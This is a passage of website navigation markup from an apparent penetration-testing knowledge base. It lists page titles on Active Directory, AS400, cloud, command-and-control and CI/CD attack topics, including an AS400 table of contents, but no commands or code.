  <span class="md-ellipsis">
    Password - AD User Comment
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-dsrm-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - DSRM Credentials
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-group-policy-preferences/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - Group Policy Preferences
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-precreated-computer/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - Pre-Created Computer Account
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-read-dmsa/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - dMSA
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-read-gmsa/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - GMSA
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-read-laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-shadow-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - Shadow Credentials
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-spraying/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - Spraying
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust-pam/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Trust - Privileged Access Management
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust-relationship/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Trust - Relationship
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust-sid-hijacking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Child Domain to Forest Compromise - SID Hijacking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust-ticket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest to Forest Compromise - Trust Ticket
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_66" >
        
          
          <label class="md-nav__link" for="__nav_3_66" id="__nav_3_66_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    CVE
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_66_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_66">
            <span class="md-nav__icon md-icon"></span>
            CVE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/MS14-068/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MS14-068 Checksum Validation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/NoPAC/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NoPAC / samAccountName Spoofing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/PrintNightmare/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrintNightmare
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/PrivExchange/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivExchange
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/ZeroLogon/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ZeroLogon
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Cheatsheets
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    AS400
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    AS400
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab" class="md-nav__link">
    <span class="md-ellipsis">
      Lab
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#access-and-audit" class="md-nav__link">
    <span class="md-ellipsis">
      Access and Audit
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#default-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      Default Credentials
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      User Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="User Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#telnet" class="md-nav__link">
    <span class="md-ellipsis">
      Telnet
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pop3" class="md-nav__link">
    <span class="md-ellipsis">
      POP3
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#useful-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Useful Commands
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nmap-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      NMAP Scripts
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-class" class="md-nav__link">
    <span class="md-ellipsis">
      User Class
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authority" class="md-nav__link">
    <span class="md-ellipsis">
      Authority
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#special-authority" class="md-nav__link">
    <span class="md-ellipsis">
      Special Authority
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#adopted-authority" class="md-nav__link">
    <span class="md-ellipsis">
      Adopted Authority
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-cracking" class="md-nav__link">
    <span class="md-ellipsis">
      Password Cracking
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Escalation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#initial-program-breakout" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Program Breakout
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hijack-profile-secofr-security-class" class="md-nav__link">
    <span class="md-ellipsis">
      Hijack Profile - SECOFR Security Class
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hijack-profile-authorities" class="md-nav__link">
    <span class="md-ellipsis">
      Hijack Profile - Authorities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hijack-profile-profile-swapping" class="md-nav__link">
    <span class="md-ellipsis">
      Hijack Profile - Profile Swapping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unqualified-library-calls" class="md-nav__link">
    <span class="md-ellipsis">
      Unqualified Library Calls
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#from-allobj-to-secadm" class="md-nav__link">
    <span class="md-ellipsis">
      From ALLOBJ to SECADM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#arbitrary-command-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Arbitrary Command Execution
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../escape-breakout/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kiosk Escape and Jail Breakout
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-cracking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash Cracking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../liferay/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Liferay
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mimikatz-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Mimikatz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../miscellaneous-tricks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Miscellaneous &amp; Tricks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../network-discovery/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Network Discovery
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../powershell-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Powershell
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shell-bind-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bind Shell
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shell-reverse-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Reverse Shell Cheat Sheet
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Cloud
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Cloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
        
          
          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Aws
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_1">
            <span class="md-nav__icon md-icon"></span>
            Aws
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-access-token/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Access Token &amp; Secrets
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-cli/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - CLI
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-cognito/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - Cognito
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-dynamodb/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - DynamoDB
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ec2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - EC2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Enumerate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-iam/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Identity &amp; Access Management
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ioc-detection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - IOC &amp; Detections
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-lambda/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - Lambda &amp; API Gateway
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-metadata/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Metadata SSRF
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-s3-bucket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - S3 Buckets
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ssm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - SSM
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-training/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Training
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Azure
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            Azure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/aka-ms/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    aka.ms Shortcuts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-access-and-token/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Access and Tokens
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-ad-conditional-access-policy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Conditional Access Policy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-ad-connect/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - AD Connect and Cloud Sync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-devices-users-sp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - IAM
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Enumerate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-phishing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Phishing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-requirements/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure - Requirements
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-application-endpoint/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Application Endpoint
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-application-proxy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Application Proxy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-container-registry/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Container Registry
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-deployment-template/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Deployment Template
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Azure DevOps
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-keyvault/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - KeyVault
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-microsoft-intune/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Microsoft Intune
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-office-365/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Office 365
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-runbook/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Runbook and Automation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-storage-blob/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Storage Blob
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-virtual-machine/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Virtual Machine
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-web-apps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Web Apps
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-web-domains/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - DNS Suffix
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
        
          
          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Ibm
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_3">
            <span class="md-nav__icon md-icon"></span>
            Ibm
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/ibm/ibm-cloud-databases/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    IBM Cloud Managed Database Services
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/ibm/ibm-cloud-object-storage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    IBM Cloud Object Storage
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Command control
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Command control
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike-beacons/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cobalt Strike - Beacons
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike-kits/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cobalt Strike - Kits
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cobalt Strike
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/metasploit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Metasploit
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/mythic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Mythic C2
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Containers
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Containers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../containers/docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../containers/kubernetes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kubernetes
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Databases
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Databases
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-audit-checks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Audit Checks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-command-execution/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Command Execution
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Credentials
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Database Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-linked-database/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Linked Database
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Devops
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Devops
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CI/CD Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-azure-devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CI/CD - Azure DevOps
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-buildkite/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CI/CD - BuildKite
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-circle-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CI/CD - CircleCI
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
